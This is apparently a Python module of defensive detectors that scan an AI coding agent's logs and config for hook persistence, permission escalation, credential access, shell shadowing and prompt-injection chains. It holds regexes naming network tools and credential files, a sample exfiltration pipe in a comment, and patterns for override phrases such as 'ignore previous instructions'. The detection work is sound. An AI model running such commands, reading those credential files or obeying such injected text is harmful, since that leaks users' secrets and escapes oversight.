"""Detectors for agent-layer compromise.

Three detectors ship in v1, each grounded in a documented mechanism rather than
a heuristic guess:

* hook persistence  - CVE-2026-25725 (sandbox escape via injected settings.json
  hooks) plus the wider hook surface: 5 handler types across 7 config locations.
* permission bypass - `permissionMode` is recorded per transcript line, so a
  switch to unattended execution is evidence, not inference.
* credential access - tool calls touching credential material, reported with
  the outcome from `toolUseResult` so an attempt is not confused with a success.

Tuned against real usage rather than synthetic samples. Two rules do most of
the noise reduction and are load-bearing: only action-bearing input fields are
matched (a marker inside `description` or a written file body proves nothing),
and hooks belonging to plugins installed from a known marketplace are expected
infrastructure rather than findings.
"""

from __future__ import annotations

import json
import re
from collections import defaultdict
from dataclasses import asdict, dataclass, field
from pathlib import Path

from .history import PromptRecord
from .inventory import InstalledPlugin, McpServer, ProjectTrust, format_timestamp, parse_timestamp
from .artifacts import SELF_CONFIG_FRAGMENTS, SELF_CONFIG_SUFFIXES, FileVersion, Job
from .model import HookRun, Session
from .shellsnap import Snapshot, is_tool_shadow
from .redact import redact_value, truncate

# Hook events that fire without the user invoking a tool. A handler here runs
# on its own schedule, which is what makes it a persistence primitive.
AUTOSTART_EVENTS = {
    "SessionStart",
    "Setup",
    "InstructionsLoaded",
    "UserPromptSubmit",
    "UserPromptExpansion",
    "SessionEnd",
    "Stop",
    "SubagentStart",
    "CwdChanged",
    "ConfigChange",
}

_EXEC_NETWORK = re.compile(
    r"(?i)\b(curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|base64|xxd|"
    r"certutil|bitsadmin|Invoke-WebRequest|Invoke-Expression|iwr|iex|"
    r"powershell|osascript|eval|exec)\b|/dev/tcp/|>\s*/dev/(tcp|udp)"
)

# Narrower than _EXEC_NETWORK: primitives that move data off the host. Used to
# escalate an otherwise-routine credential touch.
_EGRESS = re.compile(
    r"(?i)\b(curl|wget|nc|ncat|netcat|scp|sftp|rsync|ftp|mail|sendmail|"
    r"Invoke-WebRequest|iwr)\b|/dev/tcp/"
)

# Remote execution: the command body runs elsewhere, so credential markers
# inside it describe the remote host rather than local access. Without this
# split, ordinary administration reads as exfiltration, which measured as the
# single largest source of false high-severity findings.
_REMOTE_EXEC = re.compile(r"(?i)\bssh\b|\bdocker\s+exec\b|\bkubectl\s+exec\b|\bpodman\s+exec\b")

# Output piped into a data-send primitive. This overrides the remote-execution
# exemption: `docker exec app env | curl -d @- host` collects remotely but
# ships locally, which is exfiltration whichever host produced the data.
_PIPED_EGRESS = re.compile(r"(?i)\|\s*(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|mail|sendmail|openssl)\b")

# Material whose disclosure is damaging on its own.
CRITICAL_MARKERS = (
    ".aws/credentials",
    ".ssh/id_",
    "id_rsa",
    "id_ed25519",
    ".ssh/authorized_keys",
    "/proc/self/environ",
    "/proc/environ",
    ".git-credentials",
    ".netrc",
    ".pgpass",
    "Keychains/login.keychain",
    ".claude/.credentials.json",
    ".config/gh/hosts.yml",
)

# Routinely touched during ordinary development. Only interesting when the same
# action also moves data off the host.
CONTEXTUAL_MARKERS = (
    ".aws/config",
    ".npmrc",
    ".pypirc",
    ".docker/config.json",
    ".kube/config",
    "credentials.json",
    "service-account",
)

# `env`/`printenv` as an actual dump: at the end of a command or feeding a pipe,
# not the word "env" sitting in a sentence.
_ENV_DUMP = re.compile(r"\b(?:printenv|env)\b\s*(?:\d?>\s*\S+\s*)?(?:\||;|&&|$)")
_DOTENV = re.compile(r"(?:^|[^A-Za-z0-9_.-])\.env(\.[A-Za-z0-9_-]+)?(?:$|[^A-Za-z0-9_-])")
# Templates carry variable names, not values.
_DOTENV_TEMPLATE_SUFFIXES = {"example", "sample", "template", "dist", "md", "txt"}

# Fields that name what an action targets. Everything else is narrative
# (`description`, `prompt`) or payload (`content`, `new_string`) - a credential
# path appearing there is discussion about credentials, not access to them.
NARRATIVE_FIELDS = {
    "description",
    "content",
    "old_string",
    "new_string",
    "prompt",
    "explanation",
    "thought",
    "query",
}

TOOL_ACTION_FIELDS: dict[str, tuple[str, ...]] = {
    "Bash": ("command",),
    "Read": ("file_path",),
    "Write": ("file_path",),
    "Edit": ("file_path",),
    "MultiEdit": ("file_path",),
    "NotebookEdit": ("notebook_path",),
    "Grep": ("path", "glob"),
    "Glob": ("path", "pattern"),
    # A subagent's own tool calls are recorded as sidechain events; its task
    # prompt is narrative.
    "Agent": (),
    "Task": (),
    "AskUserQuestion": (),
    "WebSearch": (),
    "SendMessage": (),
    "TodoWrite": (),
}

UNATTENDED_MODES = {"bypassPermissions", "dangerouslySkipPermissions"}

# CLI flags that hand a background job unattended execution.
DANGEROUS_LAUNCH_FLAGS = {
    "--dangerously-skip-permissions",
    "--dangerously-skip-permission-prompts",
    "--no-confirm",
}

# Content the agent ingests from somewhere it did not author.
INGRESS_TOOLS = ("Read", "WebFetch", "Fetch", "NotebookRead", "WebSearch")

# Language that only makes sense if the text is addressing the model. Kept
# narrow on purpose: a corpus of security work is full of loose talk about
# prompt injection, so markers alone are never a finding here.
_INJECTION_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    (
        "instruction_override",
        re.compile(
            r"(?i)\b(ignore|disregard|forget)\b[^.\n]{0,40}\b(previous|prior|above|earlier|all)\b"
            r"[^.\n]{0,25}\b(instruction|prompt|rule|direction|context)"
        ),
    ),
    ("new_instructions", re.compile(r"(?i)\bnew\s+instructions?\s*[:\-]")),
    (
        "conceal_from_user",
        re.compile(
            r"(?i)\b(do not|don't|never)\b[^.\n]{0,30}\b(tell|inform|mention|show|reveal)\b"
            r"[^.\n]{0,25}\buser\b"
        ),
    ),
    ("tag_injection", re.compile(r"(?i)<\s*/?\s*(system|instructions?)\s*>")),
    # The unicode tag block renders as nothing and has no legitimate use in
    # source or prose, which makes it a smuggling vector rather than an
    # encoding artefact.
    ("unicode_tag_chars", re.compile("[\U000e0000-\U000e007f]")),
]

# Zero-width characters were a marker until they were measured: every hit on a
# real prompt history came from pasted browser console output, which carries
# U+200B, U+2060 and U+FEFF as a matter of course. They annotate a finding now
# instead of raising one.
_ZERO_WIDTH = re.compile("[\u200b-\u200f\u2060-\u206f\ufeff]")

# Binaries whose behaviour the agent relies on. A shell function or alias by
# one of these names changes what every later command actually does.
SHADOWABLE_COMMANDS = {
    "git", "npm", "npx", "node", "curl", "wget", "ssh", "scp", "sudo", "su",
    "ls", "cat", "cp", "mv", "rm", "find", "grep", "sed", "awk", "pkill",
    "kill", "docker", "kubectl", "python", "python3", "pip", "pip3", "make",
    "aws", "gcloud", "gh", "brew", "chmod", "chown", "env", "printenv",
    "history", "sh", "bash", "zsh", "openssl", "tar", "ps",
}

# PATH elements that let an unprivileged write decide what a bare command runs.
_WRITABLE_PREFIXES = ("/tmp/", "/var/tmp/", "/dev/shm/", "/private/tmp/")

RISKY_SETTINGS = {
    "skipDangerousModePermissionPrompt": "Dangerous-mode confirmation prompt is suppressed",
    "disableAllHooks": "All hooks disabled - defensive hooks would not fire",
    "dangerouslySkipPermissions": "Permission enforcement disabled at config level",
}

_SEVERITY_STEPS = ["low", "medium", "high"]


def _downgrade(severity: str) -> str:
    index = _SEVERITY_STEPS.index(severity) if severity in _SEVERITY_STEPS else 1
    return _SEVERITY_STEPS[max(0, index - 1)]


@dataclass
class Finding:
    detector: str
    severity: str
    title: str
    detail: str
    source: str
    session_id: str = ""
    timestamp: str = ""
    evidence: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return asdict(self)


def _load_json(path: Path) -> dict | None:
    try:
        data = json.loads(path.read_text(encoding="utf-8", errors="replace"))
    except (OSError, json.JSONDecodeError):
        return None
    return data if isinstance(data, dict) else None


def _handler_risk(event: str, handler: dict) -> tuple[str, str] | None:
    """Classify one hook handler. Returns (severity, reason) or None if benign."""
    htype = handler.get("type", "command")
    autostart = event in AUTOSTART_EVENTS

    if htype == "http":
        env_vars = handler.get("allowedEnvVars") or []
        if env_vars:
            return "high", (
                f"HTTP hook forwards environment variables {list(env_vars)} to "
                f"{handler.get('url', '<no url>')}"
            )
        return ("high" if autostart else "medium"), (
            f"HTTP hook sends data to {handler.get('url', '<no url>')}"
        )

    if htype == "command":
        command = " ".join(
            [str(handler.get("command", ""))] + [str(a) for a in handler.get("args") or []]
        )
        if _EXEC_NETWORK.search(command):
            return "high", f"Command hook invokes execution/network primitive: {truncate(command, 200)}"
        if autostart:
            return "medium", f"Command hook runs on {event}: {truncate(command, 200)}"
        return "low", f"Command hook on {event}: {truncate(command, 200)}"

    if htype == "mcp_tool":
        return ("high" if autostart else "medium"), (
            f"MCP tool hook calls {handler.get('server', '?')}::{handler.get('tool', '?')}"
        )

    if htype in ("prompt", "agent"):
        return ("medium" if autostart else "low"), (
            f"{htype} hook injects model instructions on {event}"
        )

    return "medium", f"Unrecognised hook handler type {htype!r} on {event}"


def _known_plugin_paths(claude_dir: Path) -> list[str]:
    """Install paths of plugins from marketplaces the user has registered.
    Hooks under these paths are declared infrastructure, not implants."""
    marketplaces = _load_json(claude_dir / "plugins" / "known_marketplaces.json") or {}
    known = set(marketplaces.keys())
    installed = _load_json(claude_dir / "plugins" / "installed_plugins.json") or {}

    paths: list[str] = []
    entries = installed.get("plugins")
    if isinstance(entries, dict):
        for name, records in entries.items():
            marketplace = name.split("@")[-1]
            if marketplace not in known:
                continue
            for record in records if isinstance(records, list) else []:
                install_path = record.get("installPath") if isinstance(record, dict) else None
                if install_path:
                    paths.append(install_path)

    # Marketplace checkouts hold the same plugins before/alongside installation.
    for marketplace in known:
        paths.append(str(claude_dir / "plugins" / "marketplaces" / marketplace))
    return paths


def _walk_hooks(hooks: dict, source: str, expected: bool = False, redact_output: bool = True) -> list[Finding]:
    findings: list[Finding] = []
    if not isinstance(hooks, dict):
        return findings
    for event, matchers in hooks.items():
        if not isinstance(matchers, list):
            continue
        for matcher in matchers:
            if not isinstance(matcher, dict):
                continue
            for handler in matcher.get("hooks") or []:
                if not isinstance(handler, dict):
                    continue
                risk = _handler_risk(event, handler)
                if risk is None:
                    continue
                severity, reason = risk
                if handler.get("async") and event in AUTOSTART_EVENTS and severity == "medium":
                    severity = "high"
                    reason += " (async: runs detached, no visible output)"
                if expected:
                    severity = _downgrade(severity)
                    reason += " [plugin from a registered marketplace]"
                findings.append(
                    Finding(
                        detector="hook_persistence",
                        severity=severity,
                        title=f"Hook on {event}",
                        detail=reason,
                        source=source,
                        evidence={
                            "event": event,
                            "matcher": matcher.get("matcher", "*"),
                            "expected_provenance": expected,
                            "handler": redact_value(handler, redact_output),
                        },
                    )
                )
    return findings


def _settings_paths(claude_dir: Path, project_dirs: list[Path] | None = None) -> list[Path]:
    """Every settings file a hook can be declared in, user through managed policy."""
    paths: list[Path] = [
        claude_dir / "settings.json",
        claude_dir / "settings.local.json",
        claude_dir / "policy-limits.json",
        Path("/Library/Application Support/ClaudeCode/managed-settings.json"),
        Path("/etc/claude-code/managed-settings.json"),
    ]
    for project in project_dirs or []:
        paths.append(project / ".claude" / "settings.json")
        paths.append(project / ".claude" / "settings.local.json")
    return paths


def collect_declared_hook_commands(
    claude_dir: Path, project_dirs: list[Path] | None = None
) -> set[str]:
    """Command strings currently declared anywhere. An execution record naming
    a command absent from this set ran from a declaration that no longer
    exists."""
    declared: set[str] = set()

    def harvest(hooks: dict) -> None:
        if not isinstance(hooks, dict):
            return
        for matchers in hooks.values():
            for matcher in matchers if isinstance(matchers, list) else []:
                if not isinstance(matcher, dict):
                    continue
                for handler in matcher.get("hooks") or []:
                    if isinstance(handler, dict) and handler.get("command"):
                        declared.add(str(handler["command"]))

    for path in _settings_paths(claude_dir, project_dirs):
        data = _load_json(path) if path.exists() else None
        if data:
            harvest(data.get("hooks") or {})

    plugins_root = claude_dir / "plugins"
    if plugins_root.exists():
        for hooks_file in plugins_root.rglob("hooks/hooks.json"):
            data = _load_json(hooks_file)
            if data:
                harvest(data.get("hooks") or data)
    return declared


def detect_hooks(
    claude_dir: Path, project_dirs: list[Path] | None = None, redact_output: bool = True
) -> list[Finding]:
    """Scan every location a hook can be defined in."""
    findings: list[Finding] = []

    for path in _settings_paths(claude_dir, project_dirs):
        data = _load_json(path) if path.exists() else None
        if data is None:
            continue
        findings.extend(_walk_hooks(data.get("hooks") or {}, str(path), redact_output=redact_output))
        for key, description in RISKY_SETTINGS.items():
            if data.get(key):
                findings.append(
                    Finding(
                        detector="hook_persistence",
                        severity="medium",
                        title=f"Risky setting: {key}",
                        detail=description,
                        source=str(path),
                        evidence={key: data[key]},
                    )
                )

    plugins_root = claude_dir / "plugins"
    if plugins_root.exists():
        known_paths = _known_plugin_paths(claude_dir)
        for hooks_file in plugins_root.rglob("hooks/hooks.json"):
            data = _load_json(hooks_file)
            if not data:
                continue
            expected = any(str(hooks_file).startswith(prefix) for prefix in known_paths)
            findings.extend(_walk_hooks(data.get("hooks") or data, str(hooks_file), expected, redact_output))

    findings.extend(_frontmatter_hooks(claude_dir, project_dirs or [], redact_output))
    return findings


def _frontmatter_hooks(
    claude_dir: Path, project_dirs: list[Path], redact_output: bool = True
) -> list[Finding]:
    """Skills and subagents can carry hooks in YAML frontmatter. Flagged for
    manual review rather than parsed - a YAML dependency is not worth it for a
    surface this rare, and a false negative here is worse than a nudge."""
    findings: list[Finding] = []
    roots = [claude_dir / "skills", claude_dir / "agents", claude_dir / "plugins"]
    roots += [p / ".claude" / "skills" for p in project_dirs]
    roots += [p / ".claude" / "agents" for p in project_dirs]

    for root in roots:
        if not root.exists():
            continue
        for md in root.rglob("*.md"):
            try:
                head = md.read_text(encoding="utf-8", errors="replace")[:4000]
            except OSError:
                continue
            if not head.startswith("---"):
                continue
            end = head.find("\n---", 3)
            frontmatter = head[3:end] if end != -1 else head[3:]
            if re.search(r"^\s*hooks\s*:", frontmatter, re.MULTILINE):
                findings.append(
                    Finding(
                        detector="hook_persistence",
                        severity="medium",
                        title="Hooks declared in frontmatter",
                        detail="Skill or subagent definition declares hooks; review manually",
                        source=str(md),
                        evidence={"frontmatter": truncate(redact_value(frontmatter, redact_output), 600)},
                    )
                )
    return findings


def detect_permission_bypass(session: Session) -> list[Finding]:
    """Report unattended execution, separating a session launched that way from
    a session that escalated into it mid-run. Only the second shape suggests
    something changed the rules."""
    transitions: list[tuple[str | None, str, str, str, int]] = []
    current: str | None = None
    first_seen = True
    for uuid in session.order:
        event = session.events[uuid]
        mode = event.permission_mode
        if not mode or mode == current:
            continue
        previous, current = current, mode
        was_initial = first_seen and previous is None
        first_seen = False
        if mode in UNATTENDED_MODES:
            transitions.append((previous, mode, uuid, event.timestamp, was_initial))

    if not transitions:
        return []

    grouped: dict[tuple[str, bool], list[tuple]] = defaultdict(list)
    for previous, mode, uuid, timestamp, was_initial in transitions:
        grouped[(mode, bool(was_initial))].append((previous, uuid, timestamp))

    findings: list[Finding] = []
    for (mode, was_initial), items in grouped.items():
        first_uuid = items[0][1]
        start = session.order.index(first_uuid)
        tool_count = sum(len(session.events[u].tool_calls) for u in session.order[start:])
        event = session.events[first_uuid]
        findings.append(
            Finding(
                detector="permission_bypass",
                severity="medium" if was_initial else "high",
                title=(
                    f"Session started in {mode}"
                    if was_initial
                    else f"Mid-session escalation to {mode}"
                ),
                detail=(
                    f"{'Launched' if was_initial else 'Switched'} into {mode}; "
                    f"{tool_count} tool call(s) ran from that point"
                    + (f"; {len(items)} transition(s) into this mode" if len(items) > 1 else "")
                ),
                source=session.path,
                session_id=session.session_id,
                timestamp=items[0][2],
                evidence={
                    "from": items[0][0] or "unset",
                    "to": mode,
                    "initial_mode": was_initial,
                    "transitions": len(items),
                    "event_uuid": first_uuid,
                    "line": event.line_no,
                    "cwd": event.cwd,
                    "tool_calls_in_window": tool_count,
                },
            )
        )
    return findings


def _dotenv_hit(value: str) -> bool:
    for match in _DOTENV.finditer(value):
        suffix = (match.group(1) or "").lstrip(".").lower()
        if suffix not in _DOTENV_TEMPLATE_SUFFIXES:
            return True
    return False


def _credential_hits(value: str) -> tuple[list[str], list[str]]:
    """Return (critical, contextual) markers found in an action target."""
    critical = [marker for marker in CRITICAL_MARKERS if marker in value]
    contextual = [marker for marker in CONTEXTUAL_MARKERS if marker in value]
    if _dotenv_hit(value):
        contextual.append(".env")
    if _ENV_DUMP.search(value):
        contextual.append("environment dump")
    return critical, contextual


def _action_values(tool: str, tool_input: dict) -> list[str]:
    """Only the fields that name what the call acts on."""
    if not isinstance(tool_input, dict):
        return []
    allowed = TOOL_ACTION_FIELDS.get(tool)
    if allowed is not None:
        return [str(tool_input[f]) for f in allowed if isinstance(tool_input.get(f), str)]
    return [
        str(value)
        for key, value in tool_input.items()
        if isinstance(value, str) and key not in NARRATIVE_FIELDS
    ]


def _preceding_read(session: Session, event_uuid: str, redact_output: bool = True) -> dict | None:
    """Nearest ancestor that pulled in external content. A credential touch
    descending from an untrusted read is the shape of an injection chain."""
    for ancestor in session.ancestors(event_uuid):
        for call in ancestor.tool_calls:
            if call.name in ("Read", "WebFetch", "Fetch", "NotebookRead") or call.name.startswith("mcp__"):
                return {
                    "tool": call.name,
                    "input": redact_value(call.input, redact_output),
                    "event_uuid": ancestor.uuid,
                    "timestamp": ancestor.timestamp,
                }
    return None


def _assess_targets(values: list[str]) -> tuple[list[str], list[str], bool, bool]:
    """Shared classification for anything that names a command or a path:
    transcript tool calls and background job shell tasks alike."""
    critical: list[str] = []
    contextual: list[str] = []
    for value in values:
        found_critical, found_contextual = _credential_hits(value)
        critical.extend(found_critical)
        contextual.extend(found_contextual)
    egress = any(_EGRESS.search(value) for value in values)
    piped_egress = any(_PIPED_EGRESS.search(value) for value in values)
    remote_exec = any(_REMOTE_EXEC.search(value) for value in values) and not piped_egress
    return critical, contextual, egress, remote_exec


def detect_credential_access(session: Session, redact_output: bool = True) -> list[Finding]:
    findings: list[Finding] = []
    for call, result in session.iter_tool_calls():
        values = _action_values(call.name, call.input)
        if not values:
            continue

        critical, contextual, egress, remote_exec = _assess_targets(values)
        if not critical and not contextual:
            continue

        outcome = result.outcome if result else "no result recorded"
        succeeded = outcome == "ok"

        if critical:
            severity = "high" if succeeded else "medium"
        elif egress and not remote_exec:
            severity = "high" if succeeded else "medium"
        else:
            severity = "low"

        markers = sorted(set(critical + contextual))
        detail = f"Matched {markers}; outcome: {outcome}"
        if egress and not remote_exec:
            detail += "; command also invokes a network egress primitive"
        if remote_exec and not critical:
            detail += "; markers sit inside a remote execution body, not a local read"
        if not critical and not (egress and not remote_exec):
            detail += "; routine development access unless corroborated"

        event = session.events[call.event_uuid]
        findings.append(
            Finding(
                detector="credential_access",
                severity=severity,
                title=f"{call.name} touched credential material",
                detail=detail,
                source=session.path,
                session_id=session.session_id,
                timestamp=call.timestamp,
                evidence={
                    "tool": call.name,
                    "input": redact_value(call.input, redact_output),
                    "critical_markers": sorted(set(critical)),
                    "contextual_markers": sorted(set(contextual)),
                    "egress": egress,
                    "remote_exec": remote_exec,
                    "outcome": outcome,
                    "is_sidechain": event.is_sidechain,
                    "agent_id": event.agent_id or session.agent_id,
                    "permission_mode": event.permission_mode,
                    "cwd": event.cwd,
                    "event_uuid": call.event_uuid,
                    "depth": session.depth(call.event_uuid),
                    "preceded_by_read": _preceding_read(session, call.event_uuid, redact_output),
                },
            )
        )
    return findings


def detect_config_tampering(versions: list[FileVersion]) -> list[Finding]:
    """`file-history/` proves the agent wrote a file, and keeps the prior
    content. When the file is the agent's own configuration, that is the
    CVE-2026-25725 shape with the before-and-after preserved."""
    by_path: dict[str, list[FileVersion]] = defaultdict(list)
    for version in versions:
        if version.is_self_config and version.resolved_path:
            by_path[version.resolved_path].append(version)

    findings: list[Finding] = []
    for path, entries in by_path.items():
        entries.sort(key=lambda v: v.version)
        latest = entries[-1]
        findings.append(
            Finding(
                detector="config_tampering",
                severity="high",
                title="Agent modified its own configuration",
                detail=(
                    f"{path} was written by the agent; {len(entries)} version(s) retained, "
                    f"latest v{latest.version}. Prior content is recoverable from file-history."
                ),
                source=latest.stored_path,
                session_id=latest.session_id,
                evidence={
                    "resolved_path": path,
                    "digest": latest.digest,
                    "versions": [
                        {"version": v.version, "stored_path": v.stored_path, "size": v.size, "mtime": v.mtime}
                        for v in entries
                    ],
                },
            )
        )
    return findings


def detect_job_risks(jobs: list[Job], redact_output: bool = True) -> list[Finding]:
    """Background jobs carry their own launch flags and shell fan-out. Neither
    appears in the session transcript."""
    findings: list[Finding] = []
    for job in jobs:
        relaxed = [flag for flag in job.flags if flag in DANGEROUS_LAUNCH_FLAGS]
        modes = [value for value in job.flags.get("--permission-mode", []) if value in UNATTENDED_MODES]
        if relaxed or modes:
            findings.append(
                Finding(
                    detector="job_risk",
                    # A job launched unattended is the baseline shape, the same
                    # call made for sessions. An explicit skip-permissions flag
                    # is a stronger statement than a mode selection.
                    severity="high" if relaxed else "medium",
                    title="Background job launched with relaxed permissions",
                    detail=(
                        f"Job {job.job_id} respawned with "
                        + ", ".join(relaxed + [f"--permission-mode {m}" for m in modes])
                    ),
                    source=f"jobs/{job.job_id}/state.json",
                    session_id=job.session_id,
                    timestamp=job.created_at,
                    evidence={
                        "job_id": job.job_id,
                        "state": job.state,
                        "cwd": job.cwd,
                        "flags": redact_value(job.flags, redact_output),
                        "cli_version": job.cli_version,
                    },
                )
            )

        for label in job.shell_tasks:
            critical, contextual, egress, remote_exec = _assess_targets([label])
            if not critical and not (contextual and egress and not remote_exec):
                continue
            findings.append(
                Finding(
                    detector="job_risk",
                    severity="high" if critical else "medium",
                    title="Background shell task touched credential material",
                    detail=(
                        f"Job {job.job_id} fanned out a shell task matching "
                        f"{sorted(set(critical + contextual))}; no tool result is recorded for fan tasks"
                    ),
                    source=f"jobs/{job.job_id}/state.json",
                    session_id=job.session_id,
                    timestamp=job.created_at,
                    evidence={
                        "job_id": job.job_id,
                        "command": truncate(redact_value(label, redact_output), 400),
                        "critical_markers": sorted(set(critical)),
                        "contextual_markers": sorted(set(contextual)),
                        "egress": egress,
                        "remote_exec": remote_exec,
                    },
                )
            )
    return findings


def detect_shell_shadowing(snapshots: list[Snapshot], redact_output: bool = True) -> list[Finding]:
    """A function or alias named after a real binary intercepts every later use
    of it. Claude Code shadows `find`, `grep` and `pkill` itself, so the
    interesting question is never "is anything shadowed" but "is anything
    shadowed by something other than the tool"."""
    findings: list[Finding] = []
    for snapshot in snapshots:
        for name, body in snapshot.functions.items():
            if name not in SHADOWABLE_COMMANDS:
                continue
            if is_tool_shadow(body):
                continue
            critical, _, egress, _ = _assess_targets([body])
            dangerous = bool(critical) or egress or bool(_EXEC_NETWORK.search(body))
            findings.append(
                Finding(
                    detector="shell_shadowing",
                    severity="high" if dangerous else "medium",
                    title=f"Shell function shadows {name}",
                    detail=(
                        f"A function named {name} was defined in the shell the agent ran commands in"
                        + ("; its body invokes an execution or network primitive" if dangerous else "")
                    ),
                    source=snapshot.path,
                    evidence={
                        "name": name,
                        "kind": "function",
                        "body": truncate(redact_value(body, redact_output), 600),
                        "epoch_ms": snapshot.epoch_ms,
                        "shell": snapshot.shell,
                    },
                )
            )

        for name, value in snapshot.aliases.items():
            if name not in SHADOWABLE_COMMANDS:
                continue
            dangerous = bool(_EXEC_NETWORK.search(value))
            findings.append(
                Finding(
                    detector="shell_shadowing",
                    # An alias is a one-liner and usually a genuine convenience
                    # (python=python3.12); only a network or exec body earns more.
                    severity="high" if dangerous else "low",
                    title=f"Shell alias shadows {name}",
                    detail=f"alias {name}={value}",
                    source=snapshot.path,
                    evidence={
                        "name": name,
                        "kind": "alias",
                        "value": redact_value(value, redact_output),
                        "epoch_ms": snapshot.epoch_ms,
                    },
                )
            )
    return findings


def detect_path_hijack(snapshots: list[Snapshot]) -> list[Finding]:
    findings: list[Finding] = []
    for snapshot in snapshots:
        for position, entry in enumerate(snapshot.path_entries):
            if entry == "" or entry == ".":
                reason, severity = "resolves to the current working directory", "high"
            elif entry.startswith(_WRITABLE_PREFIXES) or entry.rstrip("/") in ("/tmp", "/var/tmp", "/dev/shm"):
                reason, severity = "lives in a world-writable temp directory", "high"
            elif entry.startswith("~"):
                reason, severity = "is an unexpanded tilde and will not resolve", "medium"
            elif not entry.startswith("/"):
                reason, severity = "is a relative path", "high"
            else:
                continue
            findings.append(
                Finding(
                    detector="path_hijack",
                    severity=severity,
                    title="Questionable PATH element",
                    detail=f"PATH element {position} ({entry!r}) {reason}",
                    source=snapshot.path,
                    evidence={
                        "entry": entry,
                        "position": position,
                        "total_entries": len(snapshot.path_entries),
                        "epoch_ms": snapshot.epoch_ms,
                    },
                )
            )
    return findings


def _injection_markers(text: str) -> list[str]:
    return [name for name, pattern in _INJECTION_PATTERNS if pattern.search(text)]


def _is_self_config(path: str) -> bool:
    return path.endswith(SELF_CONFIG_SUFFIXES) or any(f in path for f in SELF_CONFIG_FRAGMENTS)


def _sensitive_consequences(session: Session, ingress_uuid: str, max_depth: int) -> list[dict]:
    """Sensitive actions in the causal descendants of an ingress event."""
    consequences: list[dict] = []
    for event, depth in session.descendants(ingress_uuid, max_depth):
        if event.permission_mode in UNATTENDED_MODES:
            consequences.append(
                {"kind": "permission_escalation", "detail": event.permission_mode, "depth": depth,
                 "event_uuid": event.uuid}
            )
        for call in event.tool_calls:
            values = _action_values(call.name, call.input)
            if not values:
                continue
            critical, _, egress, remote_exec = _assess_targets(values)
            target = call.input.get("file_path") if isinstance(call.input, dict) else None
            if isinstance(target, str) and _is_self_config(target):
                consequences.append(
                    {"kind": "agent_config_write", "detail": target, "depth": depth, "event_uuid": event.uuid}
                )
            if critical:
                consequences.append(
                    {"kind": "credential_access", "detail": sorted(set(critical)), "depth": depth,
                     "tool": call.name, "event_uuid": event.uuid}
                )
            elif egress and not remote_exec:
                consequences.append(
                    {"kind": "egress", "detail": truncate(values[0], 200), "depth": depth,
                     "tool": call.name, "event_uuid": event.uuid}
                )
    return consequences


def detect_injection_chain(
    session: Session,
    redact_output: bool = True,
    max_depth: int = 6,
    stats: dict[str, int] | None = None,
) -> list[Finding]:
    """Content the agent read that reads like an instruction, followed by a
    sensitive action descending from it.

    Both halves are required. Proximity alone is meaningless - "read a file,
    then run a command" is what the tool does all day - and markers alone fire
    on any repository that discusses prompt injection, this one included."""
    findings: list[Finding] = []
    for call, result in session.iter_tool_calls():
        if result is None:
            continue
        if not (call.name in INGRESS_TOOLS or call.name.startswith("mcp__")):
            continue
        if stats is not None:
            stats["ingress_scanned"] = stats.get("ingress_scanned", 0) + 1
        content = f"{result.content}\n{result.stdout}"
        markers = _injection_markers(content)
        if not markers:
            continue
        if stats is not None:
            stats["ingress_with_markers"] = stats.get("ingress_with_markers", 0) + 1
        consequences = _sensitive_consequences(session, result.event_uuid, max_depth)
        if not consequences:
            continue

        event = session.events[call.event_uuid]
        findings.append(
            Finding(
                detector="injection_chain",
                severity="high",
                title=f"Instruction-like content read by {call.name}, followed by a sensitive action",
                detail=(
                    f"Ingested content matched {markers}; "
                    f"{len(consequences)} sensitive action(s) descend from it within {max_depth} steps"
                ),
                source=session.path,
                session_id=session.session_id,
                timestamp=call.timestamp,
                evidence={
                    "ingress_tool": call.name,
                    "ingress_input": redact_value(call.input, redact_output),
                    "markers": markers,
                    "excerpt": truncate(redact_value(content.strip(), redact_output), 500),
                    "consequences": consequences,
                    "is_sidechain": event.is_sidechain,
                    "agent_id": event.agent_id or session.agent_id,
                    "cwd": event.cwd,
                    "event_uuid": call.event_uuid,
                },
            )
        )
    return findings


# In-process handlers report themselves as "callback" and carry no identifying
# command, so they can be counted but never matched against a declaration.
OPAQUE_HOOK_COMMANDS = {"callback", ""}


def detect_hook_execution(
    session: Session, declared_commands: set[str] | None = None, redact_output: bool = True
) -> list[Finding]:
    """`stop_hook_summary` records which hooks actually ran, which is a
    different question from which hooks are declared. A hook can be declared
    and never fire, and it can fire from a declaration that has since been
    deleted."""
    findings: list[Finding] = []
    declared = declared_commands or set()

    for run in session.hook_runs:
        base = {
            "event_uuid": run.event_uuid,
            "hook_count": run.count,
            "commands": [truncate(redact_value(c, redact_output), 200) for c in run.commands],
            "cwd": run.cwd,
        }

        if run.errors:
            findings.append(
                Finding(
                    detector="hook_execution",
                    severity="high",
                    title="Hook failed while running",
                    detail=f"{len(run.errors)} error(s) reported by hooks at stop time",
                    source=session.path,
                    session_id=session.session_id,
                    timestamp=run.timestamp,
                    evidence={**base, "errors": redact_value(run.errors, redact_output)},
                )
            )

        if run.prevented_continuation:
            findings.append(
                Finding(
                    detector="hook_execution",
                    severity="high",
                    title="Hook blocked the agent from continuing",
                    detail=f"preventedContinuation set; stopReason: {run.stop_reason or '<empty>'}",
                    source=session.path,
                    session_id=session.session_id,
                    timestamp=run.timestamp,
                    evidence={**base, "stop_reason": run.stop_reason},
                )
            )

        if run.additional_context:
            findings.append(
                Finding(
                    detector="hook_execution",
                    severity="medium",
                    title="Hook injected content into the model context",
                    detail=(
                        "A hook returned additional context, which reaches the model as "
                        "instructions it did not read from the workspace"
                    ),
                    source=session.path,
                    session_id=session.session_id,
                    timestamp=run.timestamp,
                    evidence={
                        **base,
                        "additional_context": truncate(
                            redact_value(json.dumps(run.additional_context, ensure_ascii=False), redact_output), 500
                        ),
                    },
                )
            )

        undeclared = [
            command
            for command in run.commands
            if command not in OPAQUE_HOOK_COMMANDS and command not in declared
        ]
        if undeclared:
            findings.append(
                Finding(
                    detector="hook_execution",
                    severity="high",
                    title="Hook ran from a declaration that no longer exists",
                    detail=(
                        f"{len(undeclared)} executed command(s) match no hook declared in any "
                        f"settings file or installed plugin"
                    ),
                    source=session.path,
                    session_id=session.session_id,
                    timestamp=run.timestamp,
                    evidence={
                        **base,
                        "undeclared": [truncate(redact_value(c, redact_output), 200) for c in undeclared],
                    },
                )
            )
    return findings


def detect_pasted_injection(
    records: list[PromptRecord], redact_output: bool = True
) -> list[Finding]:
